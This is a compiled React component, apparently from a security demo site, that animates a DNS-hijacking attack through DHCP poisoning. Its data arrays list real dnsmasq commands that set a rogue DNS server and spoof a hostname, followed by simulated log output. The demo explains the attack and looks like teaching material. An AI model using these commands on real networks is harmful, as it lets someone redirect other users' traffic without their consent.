{"ast":null,"code":"var _jsxFileName = \"/Users/eddy/AdvCUA_page/attack-demo/src/components/DNSHijackDemo.tsx\",\n  _s = $RefreshSig$();\nimport React, { useState, useEffect, useRef } from 'react';\nimport styled from 'styled-components';\nimport { motion, AnimatePresence } from 'framer-motion';\nimport { jsxDEV as _jsxDEV } from \"react/jsx-dev-runtime\";\nconst DemoSection = styled.section`\n  padding: 4rem 2rem;\n  max-width: 1400px;\n  margin: 0 auto;\n  min-height: 100vh;\n`;\n_c = DemoSection;\nconst SectionTitle = styled.h2`\n  font-size: 2.5rem;\n  font-weight: 700;\n  text-align: center;\n  margin-bottom: 1rem;\n  background: linear-gradient(135deg, #8b5cf6 0%, #ec4899 50%, #06b6d4 100%);\n  -webkit-background-clip: text;\n  -webkit-text-fill-color: transparent;\n  background-clip: text;\n`;\n_c2 = SectionTitle;\nconst SectionSubtitle = styled.p`\n  text-align: center;\n  color: ${props => props.theme.colors.textSecondary};\n  font-size: 1.125rem;\n  margin-bottom: 3rem;\n`;\n_c3 = SectionSubtitle;\nconst DemoGrid = styled.div`\n  display: grid;\n  grid-template-columns: 1fr 1fr;\n  gap: 2rem;\n  \n  @media (max-width: 1200px) {\n    grid-template-columns: 1fr;\n  }\n`;\n_c4 = DemoGrid;\nconst DemoContainer = styled.div`\n  background-color: ${props => props.theme.colors.surface};\n  border-radius: ${props => props.theme.borderRadius.lg};\n  padding: 2rem;\n  border: 1px solid ${props => props.theme.colors.border};\n  position: relative;\n  overflow: hidden;\n`;\n_c5 = DemoContainer;\nconst DemoHeader = styled.div`\n  display: flex;\n  justify-content: space-between;\n  align-items: center;\n  margin-bottom: 2rem;\n  padding-bottom: 1rem;\n  border-bottom: 1px solid ${props => props.theme.colors.border};\n`;\n_c6 = DemoHeader;\nconst DemoTitle = styled.h3`\n  font-size: 1.25rem;\n  font-weight: 600;\n  color: ${props => props.theme.colors.text};\n`;\n_c7 = DemoTitle;\nconst DNSTopology = styled.div`\n  padding: 2rem;\n  text-align: center;\n  background: linear-gradient(135deg, rgba(139, 92, 246, 0.05) 0%, rgba(236, 72, 153, 0.05) 100%);\n  border-radius: ${props => props.theme.borderRadius.md};\n  margin-bottom: 2rem;\n`;\n_c8 = DNSTopology;\nconst DHCPContainer = styled.div`\n  display: flex;\n  flex-direction: column;\n  align-items: center;\n  gap: 2rem;\n  margin: 2rem 0;\n`;\n_c9 = DHCPContainer;\nconst DHCPFlow = styled.div`\n  display: flex;\n  justify-content: space-between;\n  align-items: center;\n  width: 100%;\n  position: relative;\n`;\n_c0 = DHCPFlow;\nconst NetworkNode = styled(motion.div)`\n  width: 100px;\n  height: 100px;\n  border-radius: 12px;\n  display: flex;\n  flex-direction: column;\n  align-items: center;\n  justify-content: center;\n  color: white;\n  font-weight: 600;\n  font-size: 0.75rem;\n  position: relative;\n  border: 3px solid;\n  \n  ${props => {\n  switch (props.nodeType) {\n    case 'client':\n      return `\n          background: linear-gradient(135deg, #06b6d4 0%, #0891b2 100%);\n          border-color: #06b6d4;\n        `;\n    case 'dhcp':\n      return `\n          background: linear-gradient(135deg, #8b5cf6 0%, #7c3aed 100%);\n          border-color: #8b5cf6;\n        `;\n    case 'dns':\n      return `\n          background: linear-gradient(135deg, #ec4899 0%, #db2777 100%);\n          border-color: #ec4899;\n        `;\n  }\n}}\n`;\n_c1 = NetworkNode;\nconst NodeLabel = styled.div`\n  font-size: 0.7rem;\n  margin-top: 0.5rem;\n`;\n_c10 = NodeLabel;\nconst NodeIP = styled.div`\n  font-size: 0.6rem;\n  opacity: 0.9;\n`;\n_c11 = NodeIP;\nconst FlowArrow = styled(motion.div)`\n  position: absolute;\n  top: 50%;\n  transform: translateY(-50%);\n  height: 3px;\n  background: ${props => props.isActive ? 'linear-gradient(90deg, #8b5cf6 0%, #ec4899 50%, #06b6d4 100%)' : '#374151'};\n  border-radius: 2px;\n  \n  &::after {\n    content: '';\n    position: absolute;\n    right: -8px;\n    top: -5px;\n    width: 0;\n    height: 0;\n    border-left: 8px solid ${props => props.isActive ? '#06b6d4' : '#374151'};\n    border-top: 5px solid transparent;\n    border-bottom: 5px solid transparent;\n  }\n  \n  &.arrow-1 {\n    left: 120px;\n    width: 80px;\n  }\n  \n  &.arrow-2 {\n    right: 120px;\n    width: 80px;\n  }\n`;\n_c12 = FlowArrow;\nconst StepIndicator = styled.div`\n  display: flex;\n  justify-content: center;\n  gap: 1rem;\n  margin: 1rem 0;\n`;\n_c13 = StepIndicator;\nconst Step = styled(motion.div)`\n  width: 12px;\n  height: 12px;\n  border-radius: 50%;\n  background-color: ${props => props.active ? '#8b5cf6' : '#374151'};\n  transition: all 0.3s ease;\n`;\n_c14 = Step;\nconst Terminal = styled.div`\n  background-color: #1e1e1e;\n  border-radius: ${props => props.theme.borderRadius.md};\n  padding: 1.5rem;\n  font-family: 'Consolas', 'Monaco', 'Courier New', monospace;\n  font-size: 0.8rem;\n  height: 400px;\n  overflow-y: auto;\n  position: relative;\n`;\n_c15 = Terminal;\nconst TerminalHeader = styled.div`\n  display: flex;\n  align-items: center;\n  gap: 0.5rem;\n  margin-bottom: 1rem;\n  padding-bottom: 0.5rem;\n  border-bottom: 1px solid #374151;\n`;\n_c16 = TerminalHeader;\nconst TerminalDot = styled.div`\n  width: 12px;\n  height: 12px;\n  border-radius: 50%;\n  background-color: ${props => props.color};\n`;\n_c17 = TerminalDot;\nconst TerminalTitle = styled.span`\n  color: #9ca3af;\n  font-size: 0.75rem;\n`;\n_c18 = TerminalTitle;\nconst CommandLine = styled(motion.div)`\n  color: #10b981;\n  margin: 0.5rem 0;\n  \n  &::before {\n    content: \"$ \";\n    color: #8b5cf6;\n  }\n`;\n_c19 = CommandLine;\nconst OutputLine = styled(motion.div)`\n  color: ${props => {\n  switch (props.type) {\n    case 'success':\n      return '#10b981';\n    case 'error':\n      return '#ef4444';\n    case 'warning':\n      return '#f59e0b';\n    case 'info':\n      return '#06b6d4';\n    default:\n      return '#d1d5db';\n  }\n}};\n  margin: 0.25rem 0;\n  font-size: 0.75rem;\n`;\n_c20 = OutputLine;\nconst ControlPanel = styled.div`\n  display: flex;\n  gap: 1rem;\n  margin-bottom: 2rem;\n  flex-wrap: wrap;\n`;\n_c21 = ControlPanel;\nconst ControlButton = styled.button`\n  padding: 0.5rem 1rem;\n  border-radius: ${props => props.theme.borderRadius.md};\n  border: none;\n  font-weight: 600;\n  font-size: 0.875rem;\n  cursor: pointer;\n  transition: all 0.2s ease;\n  display: flex;\n  align-items: center;\n  gap: 0.5rem;\n  \n  ${props => {\n  switch (props.variant) {\n    case 'primary':\n      return `\n          background: linear-gradient(135deg, #8b5cf6 0%, #7c3aed 100%);\n          color: white;\n          &:hover { transform: translateY(-1px); box-shadow: 0 4px 12px rgba(139, 92, 246, 0.3); }\n        `;\n    case 'danger':\n      return `\n          background: linear-gradient(135deg, #ef4444 0%, #dc2626 100%);\n          color: white;\n          &:hover { transform: translateY(-1px); box-shadow: 0 4px 12px rgba(239, 68, 68, 0.3); }\n        `;\n    case 'success':\n      return `\n          background: linear-gradient(135deg, #10b981 0%, #059669 100%);\n          color: white;\n          &:hover { transform: translateY(-1px); box-shadow: 0 4px 12px rgba(16, 185, 129, 0.3); }\n        `;\n    case 'warning':\n      return `\n          background: linear-gradient(135deg, #f59e0b 0%, #d97706 100%);\n          color: white;\n          &:hover { transform: translateY(-1px); box-shadow: 0 4px 12px rgba(245, 158, 11, 0.3); }\n        `;\n    default:\n      return `\n          background-color: ${props.theme.colors.surface};\n          color: ${props.theme.colors.text};\n          border: 1px solid ${props.theme.colors.border};\n          &:hover { background-color: ${props.theme.colors.surfaceLight}; }\n        `;\n  }\n}}\n  \n  &:disabled {\n    opacity: 0.5;\n    cursor: not-allowed;\n  }\n`;\n_c22 = ControlButton;\nconst StatusIndicator = styled.div`\n  display: flex;\n  align-items: center;\n  gap: 0.5rem;\n  padding: 0.5rem 1rem;\n  border-radius: ${props => props.theme.borderRadius.md};\n  font-size: 0.875rem;\n  font-weight: 600;\n  \n  ${props => {\n  switch (props.status) {\n    case 'idle':\n      return `\n          background-color: rgba(107, 114, 128, 0.1);\n          color: #6b7280;\n        `;\n    case 'dhcp':\n      return `\n          background-color: rgba(139, 92, 246, 0.1);\n          color: #8b5cf6;\n        `;\n    case 'dns':\n      return `\n          background-color: rgba(236, 72, 153, 0.1);\n          color: #ec4899;\n        `;\n    case 'spoofing':\n      return `\n          background-color: rgba(239, 68, 68, 0.1);\n          color: #ef4444;\n        `;\n    case 'monitoring':\n      return `\n          background-color: rgba(16, 185, 129, 0.1);\n          color: #10b981;\n        `;\n  }\n}}\n`;\n_c23 = StatusIndicator;\nconst StatusDot = styled.div`\n  width: 8px;\n  height: 8px;\n  border-radius: 50%;\n  background-color: currentColor;\n  animation: ${props => props.isActive ? 'pulse 2s infinite' : 'none'};\n  \n  @keyframes pulse {\n    0% { opacity: 1; }\n    50% { opacity: 0.5; }\n    100% { opacity: 1; }\n  }\n`;\n_c24 = StatusDot;\nconst InfoPanel = styled.div`\n  background: linear-gradient(135deg, rgba(139, 92, 246, 0.05) 0%, rgba(236, 72, 153, 0.05) 100%);\n  border-radius: ${props => props.theme.borderRadius.md};\n  padding: 1rem;\n  margin-bottom: 1rem;\n`;\n_c25 = InfoPanel;\nconst InfoTitle = styled.h4`\n  color: ${props => props.theme.colors.text};\n  font-size: 1rem;\n  font-weight: 600;\n  margin-bottom: 0.5rem;\n`;\n_c26 = InfoTitle;\nconst InfoText = styled.p`\n  color: ${props => props.theme.colors.textSecondary};\n  font-size: 0.875rem;\n  line-height: 1.5;\n`;\n\n// Attack simulation data\n_c27 = InfoText;\nconst dhcpPoisoningSteps = [{\n  command: \"apt-get update && apt-get install -y dnsmasq\",\n  description: \"Installing dnsmasq for DHCP/DNS services\"\n}, {\n  command: \"systemctl stop systemd-resolved\",\n  description: \"Stopping system DNS resolver\"\n}, {\n  command: \"cat > /etc/dnsmasq.conf\",\n  description: \"Configuring DHCP server\"\n}];\nconst dnsConfigSteps = [{\n  command: \"echo 'dhcp-range=192.168.2.50,192.168.2.150,12h' >> /etc/dnsmasq.conf\",\n  description: \"Setting DHCP range\"\n}, {\n  command: \"echo 'dhcp-option=6,192.168.2.101' >> /etc/dnsmasq.conf\",\n  description: \"Setting DNS server option\"\n}, {\n  command: \"echo 'address=/target-server/192.168.2.150' >> /etc/dnsmasq.conf\",\n  description: \"Adding DNS spoofing entry\"\n}];\nconst attackExecutionSteps = [{\n  command: \"systemctl restart dnsmasq\",\n  description: \"Starting malicious DHCP/DNS server\"\n}, {\n  command: \"systemctl status dnsmasq\",\n  description: \"Verifying service status\"\n}, {\n  command: \"tail -f /var/log/dnsmasq.log\",\n  description: \"Monitoring DNS queries\"\n}];\nexport const DNSHijackDemo = () => {\n  _s();\n  const [currentPhase, setCurrentPhase] = useState('idle');\n  const [currentStep, setCurrentStep] = useState(0);\n  const [terminalOutput, setTerminalOutput] = useState([]);\n  const [isAttackActive, setIsAttackActive] = useState(false);\n  const [dhcpFlowActive, setDhcpFlowActive] = useState(false);\n  const terminalRef = useRef(null);\n  const scrollToBottom = () => {\n    if (terminalRef.current) {\n      terminalRef.current.scrollTop = terminalRef.current.scrollHeight;\n    }\n  };\n  useEffect(() => {\n    scrollToBottom();\n  }, [terminalOutput]);\n  const addTerminalLine = (type, content, outputType) => {\n    setTerminalOutput(prev => [...prev, {\n      type,\n      content,\n      outputType\n    }]);\n  };\n  const simulateDHCPSetup = async () => {\n    setCurrentPhase('dhcp');\n    setCurrentStep(1);\n    addTerminalLine('output', '=== Setting up Malicious DHCP Server ===', 'info');\n    for (const step of dhcpPoisoningSteps) {\n      await new Promise(resolve => setTimeout(resolve, 1500));\n      addTerminalLine('command', step.command);\n      await new Promise(resolve => setTimeout(resolve, 800));\n      if (step.command.includes('apt-get')) {\n        addTerminalLine('output', 'Reading package lists... Done', 'info');\n        addTerminalLine('output', 'Building dependency tree... Done', 'info');\n        addTerminalLine('output', 'dnsmasq is already the newest version (2.90-0ubuntu0.22.04.1).', 'success');\n        addTerminalLine('output', '0 upgraded, 0 newly installed, 0 to remove and 0 not upgraded.', 'success');\n      } else if (step.command.includes('systemctl stop')) {\n        addTerminalLine('output', 'Stopped system DNS resolver', 'warning');\n      } else if (step.command.includes('cat >')) {\n        addTerminalLine('output', 'Creating dnsmasq configuration...', 'info');\n      }\n    }\n    addTerminalLine('output', '✅ DHCP server configuration ready', 'success');\n  };\n  const simulateDNSConfig = async () => {\n    setCurrentPhase('dns');\n    setCurrentStep(2);\n    addTerminalLine('output', '=== Configuring DNS Spoofing ===', 'info');\n    for (const step of dnsConfigSteps) {\n      await new Promise(resolve => setTimeout(resolve, 1200));\n      addTerminalLine('command', step.command);\n      await new Promise(resolve => setTimeout(resolve, 600));\n      if (step.command.includes('dhcp-range')) {\n        addTerminalLine('output', 'DHCP range: 192.168.2.50 - 192.168.2.150', 'info');\n      } else if (step.command.includes('dhcp-option')) {\n        addTerminalLine('output', 'DNS server set to: 192.168.2.101 (attacker)', 'warning');\n      } else if (step.command.includes('address=')) {\n        addTerminalLine('output', 'DNS spoofing: target-server → 192.168.2.150', 'warning');\n      }\n    }\n    addTerminalLine('output', '🎯 DNS spoofing configuration complete', 'warning');\n  };\n  const simulateAttackExecution = async () => {\n    setCurrentPhase('spoofing');\n    setCurrentStep(3);\n    setDhcpFlowActive(true);\n    addTerminalLine('output', '=== Launching Attack ===', 'info');\n    for (const step of attackExecutionSteps) {\n      await new Promise(resolve => setTimeout(resolve, 1500));\n      addTerminalLine('command', step.command);\n      await new Promise(resolve => setTimeout(resolve, 800));\n      if (step.command.includes('restart dnsmasq')) {\n        addTerminalLine('output', 'Starting DNS forwarder and DHCP server dnsmasq', 'success');\n        addTerminalLine('output', '[ OK ]', 'success');\n        setIsAttackActive(true);\n      } else if (step.command.includes('status dnsmasq')) {\n        addTerminalLine('output', '● dnsmasq.service - dnsmasq - A lightweight DHCP and caching DNS server', 'info');\n        addTerminalLine('output', '   Loaded: loaded (/lib/systemd/system/dnsmasq.service; enabled)', 'info');\n        addTerminalLine('output', '   Active: active (running) since Wed 2025-09-18 01:04:23 UTC', 'success');\n      } else if (step.command.includes('tail -f')) {\n        addTerminalLine('output', 'Sep 18 01:04:24 dnsmasq[1234]: started, version 2.90', 'info');\n        addTerminalLine('output', 'Sep 18 01:04:24 dnsmasq[1234]: DHCP, IP range 192.168.2.50 -- 192.168.2.150', 'info');\n        addTerminalLine('output', 'Sep 18 01:04:25 dnsmasq[1234]: DHCPDISCOVER(eth0) 192.168.2.100', 'warning');\n        addTerminalLine('output', 'Sep 18 01:04:25 dnsmasq[1234]: DHCPOFFER(eth0) 192.168.2.100 02:42:c0:a8:02:64', 'warning');\n        addTerminalLine('output', 'Sep 18 01:04:25 dnsmasq[1234]: DHCPACK(eth0) 192.168.2.100 02:42:c0:a8:02:64', 'warning');\n        setCurrentPhase('monitoring');\n      }\n    }\n    addTerminalLine('output', '🔥 DNS hijacking attack is now active!', 'error');\n\n    // Simulate DNS queries\n    setTimeout(() => {\n      addTerminalLine('output', 'Sep 18 01:04:30 dnsmasq[1234]: query[A] target-server from 192.168.2.100', 'warning');\n      addTerminalLine('output', 'Sep 18 01:04:30 dnsmasq[1234]: config target-server is 192.168.2.150', 'error');\n      addTerminalLine('output', '🎯 DNS query intercepted and spoofed!', 'error');\n    }, 3000);\n  };\n  const resetDemo = () => {\n    setCurrentPhase('idle');\n    setCurrentStep(0);\n    setTerminalOutput([]);\n    setIsAttackActive(false);\n    setDhcpFlowActive(false);\n  };\n  const startFullAttack = async () => {\n    resetDemo();\n    await simulateDHCPSetup();\n    await simulateDNSConfig();\n    await simulateAttackExecution();\n  };\n  const getStatusText = () => {\n    switch (currentPhase) {\n      case 'dhcp':\n        return 'DHCP Setup';\n      case 'dns':\n        return 'DNS Config';\n      case 'spoofing':\n        return 'Attack Active';\n      case 'monitoring':\n        return 'Monitoring';\n      default:\n        return 'Ready';\n    }\n  };\n  return /*#__PURE__*/_jsxDEV(DemoSection, {\n    id: \"dns-hijack\",\n    children: [/*#__PURE__*/_jsxDEV(SectionTitle, {\n      children: \"DNS Hijacking Attack Demo\"\n    }, void 0, false, {\n      fileName: _jsxFileName,\n      lineNumber: 526,\n      columnNumber: 7\n    }, this), /*#__PURE__*/_jsxDEV(SectionSubtitle, {\n      children: \"Demonstration of DHCP poisoning and DNS spoofing to redirect domain resolution\"\n    }, void 0, false, {\n      fileName: _jsxFileName,\n      lineNumber: 527,\n      columnNumber: 7\n    }, this), /*#__PURE__*/_jsxDEV(DemoGrid, {\n      children: [/*#__PURE__*/_jsxDEV(DemoContainer, {\n        children: [/*#__PURE__*/_jsxDEV(DemoHeader, {\n          children: [/*#__PURE__*/_jsxDEV(DemoTitle, {\n            children: \"DHCP/DNS Attack Flow\"\n          }, void 0, false, {\n            fileName: _jsxFileName,\n            lineNumber: 535,\n            columnNumber: 13\n          }, this), /*#__PURE__*/_jsxDEV(StatusIndicator, {\n            status: currentPhase,\n            children: [/*#__PURE__*/_jsxDEV(StatusDot, {\n              isActive: currentPhase !== 'idle'\n            }, void 0, false, {\n              fileName: _jsxFileName,\n              lineNumber: 537,\n              columnNumber: 15\n            }, this), getStatusText()]\n          }, void 0, true, {\n            fileName: _jsxFileName,\n            lineNumber: 536,\n            columnNumber: 13\n          }, this)]\n        }, void 0, true, {\n          fileName: _jsxFileName,\n          lineNumber: 534,\n          columnNumber: 11\n        }, this), /*#__PURE__*/_jsxDEV(InfoPanel, {\n          children: [/*#__PURE__*/_jsxDEV(InfoTitle, {\n            children: \"Attack Vector\"\n          }, void 0, false, {\n            fileName: _jsxFileName,\n            lineNumber: 543,\n            columnNumber: 13\n          }, this), /*#__PURE__*/_jsxDEV(InfoText, {\n            children: \"The attacker sets up a malicious DHCP server that provides its own IP (192.168.2.101) as the DNS server. When the target host (192.168.2.100) requests DHCP configuration, it receives the attacker's DNS server, allowing DNS queries to be intercepted and spoofed.\"\n          }, void 0, false, {\n            fileName: _jsxFileName,\n            lineNumber: 544,\n            columnNumber: 13\n          }, this)]\n        }, void 0, true, {\n          fileName: _jsxFileName,\n          lineNumber: 542,\n          columnNumber: 11\n        }, this), /*#__PURE__*/_jsxDEV(DNSTopology, {\n          children: /*#__PURE__*/_jsxDEV(DHCPContainer, {\n            children: [/*#__PURE__*/_jsxDEV(DHCPFlow, {\n              children: [/*#__PURE__*/_jsxDEV(NetworkNode, {\n                nodeType: \"client\",\n                animate: {\n                  scale: currentPhase === 'dhcp' ? [1, 1.1, 1] : 1,\n                  borderColor: currentPhase === 'dhcp' ? ['#06b6d4', '#0891b2', '#06b6d4'] : '#06b6d4'\n                },\n                transition: {\n                  duration: 2,\n                  repeat: currentPhase === 'dhcp' ? Infinity : 0\n                },\n                children: [/*#__PURE__*/_jsxDEV(\"div\", {\n                  children: \"Client\"\n                }, void 0, false, {\n                  fileName: _jsxFileName,\n                  lineNumber: 562,\n                  columnNumber: 19\n                }, this), /*#__PURE__*/_jsxDEV(NodeLabel, {\n                  children: \"Target Host\"\n                }, void 0, false, {\n                  fileName: _jsxFileName,\n                  lineNumber: 563,\n                  columnNumber: 19\n                }, this), /*#__PURE__*/_jsxDEV(NodeIP, {\n                  children: \"192.168.2.100\"\n                }, void 0, false, {\n                  fileName: _jsxFileName,\n                  lineNumber: 564,\n                  columnNumber: 19\n                }, this)]\n              }, void 0, true, {\n                fileName: _jsxFileName,\n                lineNumber: 554,\n                columnNumber: 17\n              }, this), /*#__PURE__*/_jsxDEV(FlowArrow, {\n                className: \"arrow-1\",\n                isActive: dhcpFlowActive,\n                animate: {\n                  opacity: dhcpFlowActive ? [0.5, 1, 0.5] : 0.3\n                },\n                transition: {\n                  duration: 1.5,\n                  repeat: dhcpFlowActive ? Infinity : 0\n                }\n              }, void 0, false, {\n                fileName: _jsxFileName,\n                lineNumber: 567,\n                columnNumber: 17\n              }, this), /*#__PURE__*/_jsxDEV(NetworkNode, {\n                nodeType: \"dhcp\",\n                animate: {\n                  scale: currentPhase === 'dns' ? [1, 1.2, 1] : 1,\n                  borderColor: currentPhase === 'dns' ? ['#8b5cf6', '#7c3aed', '#8b5cf6'] : '#8b5cf6'\n                },\n                transition: {\n                  duration: 1.5,\n                  repeat: currentPhase === 'dns' ? Infinity : 0\n                },\n                children: [/*#__PURE__*/_jsxDEV(\"div\", {\n                  children: \"Attacker\"\n                }, void 0, false, {\n                  fileName: _jsxFileName,\n                  lineNumber: 584,\n                  columnNumber: 19\n                }, this), /*#__PURE__*/_jsxDEV(NodeLabel, {\n                  children: \"DHCP/DNS\"\n                }, void 0, false, {\n                  fileName: _jsxFileName,\n                  lineNumber: 585,\n                  columnNumber: 19\n                }, this), /*#__PURE__*/_jsxDEV(NodeIP, {\n                  children: \"192.168.2.101\"\n                }, void 0, false, {\n                  fileName: _jsxFileName,\n                  lineNumber: 586,\n                  columnNumber: 19\n                }, this)]\n              }, void 0, true, {\n                fileName: _jsxFileName,\n                lineNumber: 576,\n                columnNumber: 17\n              }, this), /*#__PURE__*/_jsxDEV(FlowArrow, {\n                className: \"arrow-2\",\n                isActive: isAttackActive,\n                animate: {\n                  opacity: isAttackActive ? [0.5, 1, 0.5] : 0.3\n                },\n                transition: {\n                  duration: 1.5,\n                  repeat: isAttackActive ? Infinity : 0\n                }\n              }, void 0, false, {\n                fileName: _jsxFileName,\n                lineNumber: 589,\n                columnNumber: 17\n              }, this), /*#__PURE__*/_jsxDEV(NetworkNode, {\n                nodeType: \"dns\",\n                animate: {\n                  scale: currentPhase === 'monitoring' ? [1, 1.1, 1] : 1,\n                  borderColor: currentPhase === 'monitoring' ? ['#ec4899', '#db2777', '#ec4899'] : '#ec4899'\n                },\n                transition: {\n                  duration: 2,\n                  repeat: currentPhase === 'monitoring' ? Infinity : 0\n                },\n                children: [/*#__PURE__*/_jsxDEV(\"div\", {\n                  children: \"Spoofed\"\n                }, void 0, false, {\n                  fileName: _jsxFileName,\n                  lineNumber: 606,\n                  columnNumber: 19\n                }, this), /*#__PURE__*/_jsxDEV(NodeLabel, {\n                  children: \"target-server\"\n                }, void 0, false, {\n                  fileName: _jsxFileName,\n                  lineNumber: 607,\n                  columnNumber: 19\n                }, this), /*#__PURE__*/_jsxDEV(NodeIP, {\n                  children: \"192.168.2.150\"\n                }, void 0, false, {\n                  fileName: _jsxFileName,\n                  lineNumber: 608,\n                  columnNumber: 19\n                }, this)]\n              }, void 0, true, {\n                fileName: _jsxFileName,\n                lineNumber: 598,\n                columnNumber: 17\n              }, this)]\n            }, void 0, true, {\n              fileName: _jsxFileName,\n              lineNumber: 553,\n              columnNumber: 15\n            }, this), /*#__PURE__*/_jsxDEV(StepIndicator, {\n              children: [1, 2, 3].map(step => /*#__PURE__*/_jsxDEV(Step, {\n                active: currentStep >= step,\n                animate: {\n                  scale: currentStep === step ? [1, 1.2, 1] : 1\n                },\n                transition: {\n                  duration: 1,\n                  repeat: currentStep === step ? Infinity : 0\n                }\n              }, step, false, {\n                fileName: _jsxFileName,\n                lineNumber: 614,\n                columnNumber: 19\n              }, this))\n            }, void 0, false, {\n              fileName: _jsxFileName,\n              lineNumber: 612,\n              columnNumber: 15\n            }, this)]\n          }, void 0, true, {\n            fileName: _jsxFileName,\n            lineNumber: 552,\n            columnNumber: 13\n          }, this)\n        }, void 0, false, {\n          fileName: _jsxFileName,\n          lineNumber: 551,\n          columnNumber: 11\n        }, this), /*#__PURE__*/_jsxDEV(ControlPanel, {\n          children: [/*#__PURE__*/_jsxDEV(ControlButton, {\n            variant: \"primary\",\n            onClick: startFullAttack,\n            disabled: currentPhase !== 'idle',\n            children: \"\\uD83D\\uDE80 Start Attack\"\n          }, void 0, false, {\n            fileName: _jsxFileName,\n            lineNumber: 628,\n            columnNumber: 13\n          }, this), /*#__PURE__*/_jsxDEV(ControlButton, {\n            variant: \"warning\",\n            onClick: simulateDHCPSetup,\n            disabled: currentPhase !== 'idle',\n            children: \"\\uD83D\\uDD27 Setup DHCP\"\n          }, void 0, false, {\n            fileName: _jsxFileName,\n            lineNumber: 631,\n            columnNumber: 13\n          }, this), /*#__PURE__*/_jsxDEV(ControlButton, {\n            variant: \"danger\",\n            onClick: simulateDNSConfig,\n            disabled: currentPhase !== 'idle',\n            children: \"\\uD83C\\uDFAF Config DNS\"\n          }, void 0, false, {\n            fileName: _jsxFileName,\n            lineNumber: 634,\n            columnNumber: 13\n          }, this), /*#__PURE__*/_jsxDEV(ControlButton, {\n            variant: \"success\",\n            onClick: simulateAttackExecution,\n            disabled: currentPhase !== 'idle',\n            children: \"\\u26A1 Execute\"\n          }, void 0, false, {\n            fileName: _jsxFileName,\n            lineNumber: 637,\n            columnNumber: 13\n          }, this), /*#__PURE__*/_jsxDEV(ControlButton, {\n            onClick: resetDemo,\n            children: \"\\uD83D\\uDD04 Reset\"\n          }, void 0, false, {\n            fileName: _jsxFileName,\n            lineNumber: 640,\n            columnNumber: 13\n          }, this)]\n        }, void 0, true, {\n          fileName: _jsxFileName,\n          lineNumber: 627,\n          columnNumber: 11\n        }, this)]\n      }, void 0, true, {\n        fileName: _jsxFileName,\n        lineNumber: 533,\n        columnNumber: 9\n      }, this), /*#__PURE__*/_jsxDEV(DemoContainer, {\n        children: [/*#__PURE__*/_jsxDEV(DemoHeader, {\n          children: /*#__PURE__*/_jsxDEV(DemoTitle, {\n            children: \"Attack Terminal\"\n          }, void 0, false, {\n            fileName: _jsxFileName,\n            lineNumber: 649,\n            columnNumber: 13\n          }, this)\n        }, void 0, false, {\n          fileName: _jsxFileName,\n          lineNumber: 648,\n          columnNumber: 11\n        }, this), /*#__PURE__*/_jsxDEV(Terminal, {\n          ref: terminalRef,\n          children: [/*#__PURE__*/_jsxDEV(TerminalHeader, {\n            children: [/*#__PURE__*/_jsxDEV(TerminalDot, {\n              color: \"#ef4444\"\n            }, void 0, false, {\n              fileName: _jsxFileName,\n              lineNumber: 654,\n              columnNumber: 15\n            }, this), /*#__PURE__*/_jsxDEV(TerminalDot, {\n              color: \"#f59e0b\"\n            }, void 0, false, {\n              fileName: _jsxFileName,\n              lineNumber: 655,\n              columnNumber: 15\n            }, this), /*#__PURE__*/_jsxDEV(TerminalDot, {\n              color: \"#10b981\"\n            }, void 0, false, {\n              fileName: _jsxFileName,\n              lineNumber: 656,\n              columnNumber: 15\n            }, this), /*#__PURE__*/_jsxDEV(TerminalTitle, {\n              children: \"root@attacker-dns:/etc\"\n            }, void 0, false, {\n              fileName: _jsxFileName,\n              lineNumber: 657,\n              columnNumber: 15\n            }, this)]\n          }, void 0, true, {\n            fileName: _jsxFileName,\n            lineNumber: 653,\n            columnNumber: 13\n          }, this), /*#__PURE__*/_jsxDEV(AnimatePresence, {\n            children: terminalOutput.map((line, index) => /*#__PURE__*/_jsxDEV(motion.div, {\n              initial: {\n                opacity: 0,\n                y: 10\n              },\n              animate: {\n                opacity: 1,\n                y: 0\n              },\n              transition: {\n                duration: 0.3\n              },\n              children: line.type === 'command' ? /*#__PURE__*/_jsxDEV(CommandLine, {\n                children: line.content\n              }, void 0, false, {\n                fileName: _jsxFileName,\n                lineNumber: 669,\n                columnNumber: 21\n              }, this) : /*#__PURE__*/_jsxDEV(OutputLine, {\n                type: line.outputType,\n                children: line.content\n              }, void 0, false, {\n                fileName: _jsxFileName,\n                lineNumber: 671,\n                columnNumber: 21\n              }, this)\n            }, index, false, {\n              fileName: _jsxFileName,\n              lineNumber: 662,\n              columnNumber: 17\n            }, this))\n          }, void 0, false, {\n            fileName: _jsxFileName,\n            lineNumber: 660,\n            columnNumber: 13\n          }, this), currentPhase !== 'idle' && /*#__PURE__*/_jsxDEV(motion.div, {\n            animate: {\n              opacity: [1, 0.5, 1]\n            },\n            transition: {\n              duration: 1,\n              repeat: Infinity\n            },\n            style: {\n              color: '#8b5cf6',\n              marginTop: '1rem'\n            },\n            children: \"\\u258B\"\n          }, void 0, false, {\n            fileName: _jsxFileName,\n            lineNumber: 678,\n            columnNumber: 15\n          }, this)]\n        }, void 0, true, {\n          fileName: _jsxFileName,\n          lineNumber: 652,\n          columnNumber: 11\n        }, this)]\n      }, void 0, true, {\n        fileName: _jsxFileName,\n        lineNumber: 647,\n        columnNumber: 9\n      }, this)]\n    }, void 0, true, {\n      fileName: _jsxFileName,\n      lineNumber: 531,\n      columnNumber: 7\n    }, this)]\n  }, void 0, true, {\n    fileName: _jsxFileName,\n    lineNumber: 525,\n    columnNumber: 5\n  }, this);\n};\n_s(DNSHijackDemo, \"eSUJa1tJ0gKPJWZ9HicEFkgWOko=\");\n_c28 = DNSHijackDemo;\nvar _c, _c2, _c3, _c4, _c5, _c6, _c7, _c8, _c9, _c0, _c1, _c10, _c11, _c12, _c13, _c14, _c15, _c16, _c17, _c18, _c19, _c20, _c21, _c22, _c23, _c24, _c25, _c26, _c27, _c28;\n$RefreshReg$(_c, \"DemoSection\");\n$RefreshReg$(_c2, \"SectionTitle\");\n$RefreshReg$(_c3, \"SectionSubtitle\");\n$RefreshReg$(_c4, \"DemoGrid\");\n$RefreshReg$(_c5, \"DemoContainer\");\n$RefreshReg$(_c6, \"DemoHeader\");\n$RefreshReg$(_c7, \"DemoTitle\");\n$RefreshReg$(_c8, \"DNSTopology\");\n$RefreshReg$(_c9, \"DHCPContainer\");\n$RefreshReg$(_c0, \"DHCPFlow\");\n$RefreshReg$(_c1, \"NetworkNode\");\n$RefreshReg$(_c10, \"NodeLabel\");\n$RefreshReg$(_c11, \"NodeIP\");\n$RefreshReg$(_c12, \"FlowArrow\");\n$RefreshReg$(_c13, \"StepIndicator\");\n$RefreshReg$(_c14, \"Step\");\n$RefreshReg$(_c15, 